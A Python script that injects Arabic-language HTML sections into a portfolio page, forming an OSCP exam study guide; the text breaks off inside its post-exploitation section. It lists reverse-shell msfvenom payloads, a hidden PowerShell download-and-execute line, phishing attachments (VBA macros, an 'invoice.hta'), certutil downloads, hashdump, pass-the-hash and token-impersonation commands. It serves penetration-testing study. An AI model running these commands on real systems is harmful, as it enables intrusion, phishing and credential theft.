import re

html_path = r"d:\abdo_portfolio\main\templates\main\methodology.html"

with open(html_path, "r", encoding="utf-8") as f:
    content = f.read()

replacements = {
    "meth-content-oscp_bof": """
      <!-- OSCP: Buffer Overflow -->
      <div class="meth-content-view" id="meth-content-oscp_bof" style="display: none; --tool-color: #ff0055;">
        <div class="phase-module-header">
          <div class="icon-wrapper">💥</div>
          <div class="header-text">
            <h2>فيض الذاكرة وتطوير الاستغلال (Buffer Overflow)</h2>
            <p>يُعد الـ Buffer Overflow من أهم الأساسيات في امتحان OSCP (يمثل 25 نقطة مضمونة). يتطلب فهم كيفية التلاعب بذاكرة البرنامج للتحكم في مسار التنفيذ (EIP) وحقن الكود الخبيث.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #ff0055;">
          <div class="card-header"><h3 style="color:#ff0055;">المنهجية المكونة من 8 خطوات أساسية</h3></div>
          <p style="font-size:0.9rem; color:var(--text-secondary); margin-bottom: 15px;">يجب تنفيذ هذه الخطوات بالترتيب الدقيق باستخدام Immunity Debugger وسكربت Mona.py لضمان نجاح الاستغلال أثناء الامتحان.</p>
          
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            <div class="cmd-card">
              <strong style="color:#00d9ff;">1. عملية الـ Fuzzing (التشويش)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الهدف هنا هو إرسال بيانات (حرف A) بشكل متزايد للتطبيق حتى ينهار (Crash). هذا يساعدنا في معرفة الحجم التقريبي للبيانات اللازمة لكسر البرنامج.</p>
              <div class="code-snippet">python fuzzer.py</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">2. إيجاد نقطة الانهيار (Find Offset)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بعد معرفة عدد البايتات التقريبي، نقوم بتوليد سلسلة حروف غير مكررة (Cyclic Pattern) ونرسلها للتطبيق. عندما ينهار التطبيق، ننظر إلى قيمة مسجل الـ EIP (مؤشر التعليمات) لمعرفة الأحرف التي كتبناها فوقه بدقة.</p>
              <div class="code-snippet">/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000
!mona findmsp -distance 3000</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">3. التحكم في الـ EIP</strong>
              <p style="font-size:0.85rem; margin:5px 0;">للتأكد من أننا نتحكم بالكامل في الـ EIP، نرسل حرف "A" بمقدار الـ Offset، يليه 4 أحرف "B" (والتي تمثل \x42 بالهيكس). إذا أصبح الـ EIP يساوي 42424242، فقد نجحنا في التحكم.</p>
              <div class="code-snippet">payload = b"A" * offset + b"B" * 4 + b"C" * 400</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">4. اكتشاف الحروف السيئة (Bad Characters)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بعض الأحرف (مثل \x00) تقوم بقطع الاتصال أو كسر الـ Payload. نقوم بإرسال كل الأحرف الممكنة ونقارن ما تم إرساله بما هو موجود في الذاكرة باستخدام Mona لاكتشاف واستبعاد هذه الأحرف.</p>
              <div class="code-snippet">!mona bytearray -b "\\x00"
!mona compare -f C:\\mona\\bytearray.bin -a [ESP_ADDRESS]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">5. البحث عن تعليمة (JMP ESP)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بما أن الـ Payload الخاص بنا سيكون موجوداً في مسجل הـ ESP، نحن بحاجة إلى العثور على تعليمة JMP ESP في إحدى ملفات الـ DLL الخاصة بالبرنامج (بشرط ألا تكون محمية بـ ASLR أو DEP) للقفز إلى الكود الخاص بنا.</p>
              <div class="code-snippet">!mona jmp -r esp -cpb "\\x00\\x0a"</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">6. توليد الشيل كود (Generate Shellcode)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">باستخدام msfvenom، نقوم بتوليد كود خبيث (Reverse Shell) مع التأكد من استبعاد الحروف السيئة التي وجدناها في الخطوة الرابعة باستخدام المتغير `-b`.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 EXITFUNC=thread -b "\\x00\\x0a" -f c</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">7. بناء الاستغلال النهائي (Exploit)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">نقوم بتجميع كل القطع: نرسل الـ A's (الـ Offset)، ثم عنوان الـ JMP ESP، ثم مساحة فارغة (NOP Sled \x90) لإعطاء المعالج مساحة للقفز بأمان، ثم أخيراً الشيل كود.</p>
              <div class="code-snippet">payload = b"A" * offset + jmp_esp + b"\\x90" * 16 + shellcode</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_lpe": """
      <!-- OSCP: Linux PrivEsc -->
      <div class="meth-content-view" id="meth-content-oscp_lpe" style="display: none; --tool-color: #00ff66;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🐧</div>
          <div class="header-text">
            <h2>تصعيد الصلاحيات في أنظمة لينكس (Linux PrivEsc)</h2>
            <p>بمجرد حصولك على صلاحية مستخدم عادي (Low-Privilege Shell)، تبدأ رحلة البحث عن الثغرات المحلية والأخطاء في الإعدادات للوصول إلى صلاحيات الجذر (Root).</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px;">
          <div class="card-header"><h3 style="color:#00d9ff;">مسارات اختراق لينكس الأساسية</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#00ff66;">1. أخطاء إعدادات Sudo</strong>
              <p style="font-size:0.85rem; margin:5px 0;">أول خطوة دائماً هي التحقق مما إذا كان المستخدم الحالي يمكنه تشغيل أي أوامر بصلاحيات الـ root دون الحاجة لكلمة مرور. إذا وجدت أمراً مسموحاً، ابحث عنه في موقع GTFOBins لمعرفة كيفية استغلاله للحصول على شيل.</p>
              <div class="code-snippet">sudo -l</div>
              <p style="font-size:0.8rem; margin-top:5px; color:#ffb020;">نصيحة الامتحان: تأكد أيضاً من التحقق من ثغرة CVE-2019-14287 عن طريق تجربة <code>sudo -u#-1 command</code>.</p>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00ff66;">2. ملفات الـ SUID / SGID</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الـ SUID هو تصريح خاص يسمح للملف بالعمل بصلاحيات مالكه (والذي غالباً ما يكون الـ Root). نبحث عن البرامج التي تمتلك هذا التصريح بشكل غير افتراضي (مثل vim، find، bash) واستغلالها.</p>
              <div class="code-snippet">find / -perm -u=s -type f 2>/dev/null
find / -perm -g=s -type f 2>/dev/null</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00ff66;">3. المهام المجدولة (Cron Jobs)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">يقرأ نظام التشغيل ملفات الـ Cron لتنفيذ المهام آلياً. إذا وجدنا سكربت يعمل كـ root ولكننا نملك صلاحية التعديل عليه (Write permissions)، يمكننا إضافة أمر Reverse Shell بداخله ليتم تنفيذه في الوقت المحدد.</p>
              <div class="code-snippet">cat /etc/crontab
ls -la /etc/cron.*</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00ff66;">4. الصلاحيات الجزئية (Capabilities)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تُستخدم الـ Capabilities لإعطاء البرامج صلاحيات معينة للـ Root دون إعطائها الصلاحية الكاملة (SUID). إذا امتلك برنامج مثل python أو perl أو tar صلاحية مثل `cap_setuid+ep`، يمكن استغلاله للترقية.</p>
              <div class="code-snippet">getcap -r / 2>/dev/null</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_wpe": """
      <!-- OSCP: Windows PrivEsc -->
      <div class="meth-content-view" id="meth-content-oscp_wpe" style="display: none; --tool-color: #00a8ff;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🪟</div>
          <div class="header-text">
            <h2>تصعيد الصلاحيات في ويندوز (Windows PrivEsc)</h2>
            <p>الترقية من مستخدم عادي (أو Service Account) إلى أعلى مستوى من الصلاحيات (NT AUTHORITY\\SYSTEM) عبر استغلال البنية التحتية لويندوز.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #00a8ff;">
          <div class="card-header"><h3 style="color:#00a8ff;">متجهات الهجوم في ويندوز</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#00a8ff;">1. انتحال الصلاحيات (Token Impersonation)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">عند اختراق سيرفر ويب (IIS) أو قاعدة بيانات (MSSQL)، غالباً ما ستحصل على مستخدم لديه صلاحية `SeImpersonatePrivilege`. هذه الصلاحية تتيح لك إجبار خدمة ذات صلاحيات عليا (SYSTEM) على المصادقة معك، ومن ثم انتحال الـ Token الخاص بها باستخدام أدوات مثل PrintSpoofer أو JuicyPotato.</p>
              <div class="code-snippet">whoami /priv
# If SeImpersonate is enabled:
PrintSpoofer64.exe -i -c cmd
JuicyPotato.exe -l 1337 -p cmd.exe -a "/c whoami" -t *</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00a8ff;">2. مسارات الخدمات غير المحمية (Unquoted Service Paths)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">عندما يتم تثبيت خدمة في ويندوز في مسار يحتوي على مسافات (مثل `C:\Program Files\App`) ولم يقم المبرمج بوضع المسار بين علامتي تنصيص `""`، سيحاول ويندوز تنفيذ `C:\Program.exe` أولاً. إذا كان لدينا صلاحية الكتابة في الـ `C:\`، يمكننا وضع ملف خبيث باسم `Program.exe` ليتم تنفيذه كـ SYSTEM.</p>
              <div class="code-snippet">wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows\\" | findstr /i /v "\\"\\"\\""</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00a8ff;">3. برامج بدء التشغيل (Registry AutoRuns)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">هناك مفاتيح في الريجستري مسؤولة عن تشغيل البرامج تلقائياً عند تسجيل الدخول. إذا وجدنا مساراً لبرنامج يعمل تلقائياً، واكتشفنا أننا نملك صلاحيات تعديل أو استبدال الملف التنفيذي لهذا البرنامج، يمكننا زرع باك دور ليتم تنفيذه عندما يدخل الـ Administrator.</p>
              <div class="code-snippet">reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00a8ff;">4. البحث عن كلمات المرور المخزنة (Stored Credentials)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">كثيراً ما يترك مدراء الأنظمة كلمات المرور كنصوص واضحة (Cleartext) في ملفات الإعدادات (XML, INI, TXT) أو يتم حفظها في الـ Credential Manager الخاص بويندوز. يجب دائماً فحص هذه الأماكن.</p>
              <div class="code-snippet">findstr /si password *.txt *.xml *.ini
cmdkey /list</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_nmap": """
      <!-- OSCP: Nmap & Enum -->
      <div class="meth-content-view" id="meth-content-oscp_nmap" style="display: none; --tool-color: #f59e0b;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📡</div>
          <div class="header-text">
            <h2>الفحص المتقدم للشبكات (Advanced Enumeration)</h2>
            <p>النجاح في OSCP يعتمد بنسبة 80% على جودة الفحص وجمع المعلومات. تفويت بورت مفتوح واحد قد يعني الفشل في اختراق الآلة.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px;">
          <div class="card-header"><h3 style="color:#f59e0b;">منهجية الفحص ذات الخطوتين (The Two-Step Scan)</h3></div>
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">الخطوة الأولى: المسح السريع لكل المنافذ (All Ports TCP)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الفحص الافتراضي لـ Nmap يفحص فقط أهم 1000 بورت. في الامتحان يجب فحص جميع الـ 65535 بورت بشكل سريع جداً للعثور على أي خدمات مخفية، مع تجاهل فحص البينج (`-Pn`).</p>
              <div class="code-snippet">sudo nmap -p- -Pn --min-rate 1000 -vvv -oG openPorts [TARGET]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">الخطوة الثانية: الفحص العميق للمنافذ المفتوحة (Deep Scan)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بعد معرفة المنافذ المفتوحة بدقة من الخطوة الأولى، نقوم بتوجيه Nmap لفحص هذه المنافذ فقط ولكن بشكل عميق جداً لمعرفة نوع الخدمة (`-sV`) وتشغيل السكربتات الافتراضية للبحث عن ثغرات بديهية (`-sC`).</p>
              <div class="code-snippet">nmap -p [PORTS] -sC -sV -O -oA full_scan [TARGET]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">لا تنسى منافذ الـ UDP! (UDP Scanning)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الكثير من الطلاب يرسبون لتجاهلهم فحص بروتوكول UDP. خدمات مثل SNMP (161) و TFTP (69) غالباً ما تخبئ متجهات هجوم قاتلة لا تظهر في فحص الـ TCP.</p>
              <div class="code-snippet">sudo nmap -sU -p 53,69,161,137,139 --top-ports 20 [TARGET]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">الفحص المخصص لخدمات SMB & SNMP</strong>
              <p style="font-size:0.85rem; margin:5px 0;">عند إيجاد بورت 445 (SMB)، استخدم أدوات متخصصة للحصول على قائمة المستخدمين أو الملفات المشتركة. للـ SNMP (161) استخدم snmpwalk لسحب بيانات النظام بالكامل.</p>
              <div class="code-snippet">smbclient -L //[TARGET] -N
enum4linux -a [TARGET]
snmpwalk -c public -v1 [TARGET]</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_xfer": """
      <!-- OSCP: File Transfers -->
      <div class="meth-content-view" id="meth-content-oscp_xfer" style="display: none; --tool-color: #ff0055;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📂</div>
          <div class="header-text">
            <h2>طرق نقل الملفات (File Transfers)</h2>
            <p>أثناء الامتحان ستحتاج باستمرار إلى نقل أدوات مثل LinPEAS أو WinPEAS أو استغلالات (Exploits) من جهاز الكالي الخاص بك إلى الآلة المخترقة. يجب إتقان هذه الطرق بشدة.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #ff0055;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#ff0055;">تحضير السيرفر في كالي (Attacker Server)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">الخطوة الأولى دائماً هي فتح سيرفر لمشاركة الملفات. الـ HTTP هو الأسهل، لكن بروتوكول SMB لا غنى عنه عند اختراق آلات ويندوز لأنه يسمح بتشغيل الملفات مباشرة دون تحميلها على القرص.</p>
              <div class="code-snippet">python3 -m http.server 80
# SMB Server for Windows targets
sudo impacket-smbserver share `pwd` -smb2support</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ff0055;">سحب الملفات إلى أنظمة لينكس</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تحميل الملفات في لينكس يتم عادة عن طريق `wget` أو `curl`. في حال عدم توفرهما، يمكن استخدام الـ Netcat لإرسال الملف عبر اتصال الشبكة.</p>
              <div class="code-snippet">wget http://[KALI]/linpeas.sh -O /tmp/linpeas.sh
curl http://[KALI]/linpeas.sh -o /tmp/linpeas.sh
nc -nv [KALI] 4444 > file.txt</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ff0055;">سحب الملفات إلى أنظمة ويندوز</strong>
              <p style="font-size:0.85rem; margin:5px 0;">أداة `Certutil` مدمجة في نظام ويندوز لتنزيل الشهادات ولكنها تستخدم كثيراً من الهاكرز لتحميل الملفات لكونها موثوقة. أيضاً يمكن استخدام PowerShell أو نسخ الملف مباشرة من الـ SMB Share الذي قمنا بإنشائه على الكالي.</p>
              <div class="code-snippet">certutil.exe -urlcache -split -f http://[KALI]/winpeas.exe C:\\Temp\\winpeas.exe
powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://[KALI]/file', 'C:\\Temp\\file')"
copy \\\\[KALI]\\share\\winpeas.exe C:\\Temp\\winpeas.exe</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_pass": """
      <!-- OSCP: Password Attacks -->
      <div class="meth-content-view" id="meth-content-oscp_pass" style="display: none; --tool-color: #9b59ff;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🔑</div>
          <div class="header-text">
            <h2>هجمات التخمين وكسر التشفير (Password Attacks)</h2>
            <p>التخمين المباشر (Brute-force) على الخدمات، وكسر الهاش (Hash Cracking) عندما نحصل على ملفات تحتوي على كلمات مرور مشفرة.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#9b59ff;">التخمين الشبكي باستخدام Hydra</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تُستخدم Hydra لتخمين كلمات المرور على الخدمات النشطة (مثل SSH, FTP, RDP, Web Logins). تعتمد قوتها على استخدام قائمة كلمات ممتازة (مثل rockyou.txt).</p>
              <div class="code-snippet">hydra -l admin -P rockyou.txt ssh://[TARGET]
hydra -L users.txt -p Password123 rdp://[TARGET]</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#9b59ff;">كسر الهاش (Offline Cracking) باستخدام Hashcat</strong>
              <p style="font-size:0.85rem; margin:5px 0;">عندما نسحب ملف الـ SAM من ويندوز أو ملف /etc/shadow من لينكس، نستخدم قوى كرت الشاشة (GPU) لكسر التشفير. يجب معرفة نوع الـ Hash لتحديد الـ Module (مثلاً 1000 لـ NTLM).</p>
              <div class="code-snippet">hashcat -m 1000 hashes.txt rockyou.txt  # NTLM
hashcat -m 1800 hashes.txt rockyou.txt  # SHA-512 (Linux shadow)
hashcat -m 5600 hashes.txt rockyou.txt  # NetNTLMv2</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#9b59ff;">تجاوز التشفير (Pass The Hash)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">في بيئات ويندوز (Active Directory)، إذا استطعنا سحب الـ NTLM Hash لمستخدم، لسنا بحاجة لكسره إطلاقاً! يمكننا استخدامه مباشرة لتسجيل الدخول وتنفيذ الأوامر باستخدام بروتوكول SMB.</p>
              <div class="code-snippet">impacket-psexec Administrator@10.10.10.10 -hashes aad3b435b51404eeaad3b435b51404ee:NTHASH</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_piv": """
      <!-- OSCP: Pivoting -->
      <div class="meth-content-view" id="meth-content-oscp_piv" style="display: none; --tool-color: #14b8a6;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🚇</div>
          <div class="header-text">
            <h2>العبور والأنفاق الشبكية (Pivoting & Tunneling)</h2>
            <p>أحد أصعب أجزاء امتحان الـ OSCP والأكثر أهمية لاختراق بيئة الـ Active Directory. العبور (Pivoting) يعني استخدام آلة مخترقة كمحطة وسيطة للوصول لشبكات داخلية معزولة لا يمكن الوصول إليها من الخارج.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#14b8a6;">بناء نفق عكسي باستخدام Chisel (SOCKS5 Proxy)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تعتبر أداة Chisel من أهم وأقوى الأدوات في الامتحان لبناء الـ Tunnels لكونها تعمل فوق بروتوكول HTTP. الفكرة هي إنشاء سيرفر على جهاز الكالي، وتشغيل أداة العميل على الجهاز المخترق ليربط شبكته الداخلية بآلة الكالي الخاصة بنا على بورت 1080.</p>
              <div class="code-snippet"># On Kali (Server)
chisel server -p 8000 --reverse

# On Target (Client)
chisel client [KALI_IP]:8000 R:socks</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#14b8a6;">توجيه الأدوات عبر النفق (Proxychains)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بعد أن أنشأنا النفق عبر Chisel، أصبح البورت 1080 على كالي متصلاً بالشبكة الداخلية! لكي نجعل أدوات مثل Nmap أو Impacket تستخدم هذا النفق، نقوم بتعديل ملف `/etc/proxychains.conf` ليحتوي على `socks5 127.0.0.1 1080` في آخره، ثم نسبق أي أمر بكلمة proxychains.</p>
              <div class="code-snippet">proxychains nmap -sT -Pn -p 445 [INTERNAL_IP]
proxychains impacket-smbexec user@172.16.0.5</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#14b8a6;">التحويل المحلي للمنافذ (SSH Local Port Forwarding)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">إذا كان لديك بيانات دخول لـ SSH على جهاز مخترق، يمكنك سحب بورت داخلي (مثل سيرفر ويب داخلي يعمل على بورت 80) إلى جهازك الشخصي لتتمكن من فتحه في متصفحك.</p>
              <div class="code-snippet">ssh -L 8080:127.0.0.1:80 user@[TARGET]</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_strat": """
      <!-- OSCP: Strategy -->
      <div class="meth-content-view" id="meth-content-oscp_strat" style="display: none; --tool-color: #ffb020;">
        <div class="phase-module-header">
          <div class="icon-wrapper">📝</div>
          <div class="header-text">
            <h2>إستراتيجية الامتحان وكتابة التقرير (Exam Strategy)</h2>
            <p>لا يهم عدد الآلات التي ستخترقها إذا فشلت في توثيقها بشكل سليم. التقرير الاحترافي والإدارة الجيدة للوقت هما مفتاح النجاح في OSCP.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#ffb020;">1. التوثيق هو كل شيء (Documentation)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">يجب أخذ لقطات شاشة (Screenshots) لكامل الشاشة (وليس فقط للنافذة). لقطة الشاشة الأساسية في أي اختراق يجب أن تحتوي على محتوى ملف الـ (proof.txt أو local.txt) بجانب أمر يظهر الـ IP الخاص بالآلة (ipconfig/ifconfig) في نفس نافذة الطرفية لضمان إثبات الاختراق.</p>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ffb020;">2. قيود Metasploit الصارمة</strong>
              <p style="font-size:0.85rem; margin:5px 0;">تذكر القاعدة الذهبية: يسمح لك باستخدام وحدات الاستغلال (Exploits) وجلسات الـ Meterpreter ضد (هدف واحد فقط) في الامتحان بأكمله. إذا فشل الاستغلال، فلن تتمكن من استخدامه على هدف آخر. ومع ذلك، أداة MSFvenom لبناء الشيل كود ووحدات الـ Multi/Handler لتلقي الاتصالات مسموحة بلا حدود.</p>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ffb020;">3. إدارة الوقت وتجنب جحور الأرانب (Rabbit Holes)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">إذا قضيت أكثر من ساعتين في محاولة استغلال ثغرة معينة ولم تنجح، توقف فوراً! ارجع لعمل فحص (Enumeration) من جديد. الامتحان مصمم ليضع أمامك مسارات وهمية (Rabbit holes) لتضييع وقتك. القاعدة هي: ابحث -> حاول -> افشل سريعاً -> ابحث مجدداً.</p>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ffb020;">4. حساب النقاط (Active Directory Points)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">اختراق مجموعة الـ Active Directory بأكملها يعطيك 40 نقطة (إما أن تأخذها كلها باختراق الـ Domain Controller أو لا تأخذ شيئاً). الآلات المستقلة تعطي 20 نقطة. يُنصح بشدة بالبدء بتدمير بيئة الـ AD أولاً لضمان نجاح كبير مبكراً.</p>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_msf": """
      <!-- OSCP: Metasploit -->
      <div class="meth-content-view" id="meth-content-oscp_msf" style="display: none; --tool-color: #0284c7;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🦇</div>
          <div class="header-text">
            <h2>تكتيكات الميتاسبلويت (Metasploit Framework)</h2>
            <p>كيفية تسخير الميتاسبلويت بذكاء داخل قيود الامتحان الصارمة لتوليد الـ Payloads وإدارة الجلسات بشكل احترافي.</p>
          </div>
        </div>
        
        <div class="cyber-card" style="margin-top:20px; border-left: 3px solid #0284c7;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px; margin-top: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">استخدامات MSFvenom (غير محدودة)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">يُسمح باستخدام MSFvenom لتوليد أي عدد من الحمولات (Payloads) لتجاوز الحماية أو تنفيذ أوامر عن بعد. سواء كانت ملفات تنفيذية (EXE/ELF) أو كود برمجي (Python/C).</p>
              <div class="code-snippet">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=4444 -f exe -o rev.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f elf -o rev.elf</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">أساسيات جلسات Meterpreter</strong>
              <p style="font-size:0.85rem; margin:5px 0;">إذا اخترت هدفك لاستخدام الـ Meterpreter عليه، يجب أن تستغل هذه الجلسة القوية لأقصى حد. استخدمها لرفع وتحميل الملفات بسهولة تامة، سحب كلمات المرور (hashdump)، وفتح طرفية مباشرة للنظام (shell).</p>
              <div class="code-snippet">getuid
sysinfo
hashdump
upload /root/linpeas.sh /tmp/linpeas.sh
download C:\\Users\\Admin\\proof.txt /root/proof.txt
shell</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#00d9ff;">توجيه الشبكة عبر الميتاسبلويت (MSF Pivoting)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">من أقوى ميزات המييتاسبلويت هي وحدة الـ Autoroute. عندما تحصل على جلسة على جهاز يتصل بشبكة داخلية أخرى، يمكنك توجيه كل هجمات الميتاسبلويت القادمة لتمر عبر هذا الجهاز المخترق.</p>
              <div class="code-snippet">run autoroute -s 172.16.5.0/24
background
use auxiliary/server/socks_proxy
run -j</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_client": """
      <!-- OSCP: Client-Side Attacks -->
      <div class="meth-content-view" id="meth-content-oscp_client" style="display: none; --tool-color: #ef4444;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🎣</div>
          <div class="header-text">
            <h2>هجمات جانب العميل (Client-Side Attacks)</h2>
            <p>أحياناً يكون السيرفر محصناً ولا يحتوي على ثغرات. الحل؟ استهداف المستخدمين (الموظفين) عبر الهندسة الاجتماعية لفتح ملفات خبيثة تعطينا اتصالاً بنظامهم.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#ef4444;">1. ماكرو مايكروسوفت أوفيس (Malicious VBA Macros)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">يتم تضمين كود برمجي بلغة VBA داخل ملفات Word أو Excel. بمجرد أن يفتح المستخدم الملف ويضغط على (Enable Content)، يتم تنفيذ الكود الذي يحمل الـ Payload ويتصل بجهازنا.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f vba
# Copy output into Word Developer -> Visual Basic -> Document_Open()</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ef4444;">2. تطبيقات الـ HTA (HTML Applications)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">ملفات الـ HTA هي صفحات إنترنت تُفتح عبر متصفح Internet Explorer ولكنها تُنفذ بصلاحيات النظام (بدون الـ Sandbox) مما يسمح بتنفيذ سكربتات VBScript خطيرة. تُستخدم كثيراً كملفات مرفقة خادعة.</p>
              <div class="code-snippet">msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f hta-psh -o invoice.hta</div>
            </div>
            
            <div class="cmd-card">
              <strong style="color:#ef4444;">3. اختصارات ويندوز الملغمة (.lnk Files)</strong>
              <p style="font-size:0.85rem; margin:5px 0;">بدلاً من إرسال ملف تنفيذي مشبوه، نرسل ملف اختصار عادي جداً (.lnk)، ولكننا نغير مساره ليقوم بفتح موجه الأوامر المخفي وتحميل سكربت PowerShell من سيرفرنا وتشغيله بصمت.</p>
              <div class="code-snippet">powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://[KALI]/rev.ps1')"</div>
            </div>
          </div>
        </div>
      </div>""",

    "meth-content-oscp_post": """
      <!-- OSCP: Post-Exploitation -->
      <div class="meth-content-view" id="meth-content-oscp_post" style="display: none; --tool-color: #10b981;">
        <div class="phase-module-header">
          <div class="icon-wrapper">🕵️</div>
          <div class="header-text">
            <h2>منهجية ما بعد الاختراق (Post-Exploitation)</h2>
            <p>الخطوات الأساسية التي يجب أن تتخذها فور نجاحك في اختراق الآلة لترسيخ تواجدك، جمع الأدلة، وسحب البيانات الحساسة.</p>
          </div>
        </div>
        <div class="cyber-card" style="margin-top:20px;">
          <div class="cmd-grid" style="display: flex; flex-direction: column; gap: 15px;">
            
            <div class="cmd-card">
              <strong style="color:#10b981;">1. الوعي الظرفي (Situational Awareness)</strong>
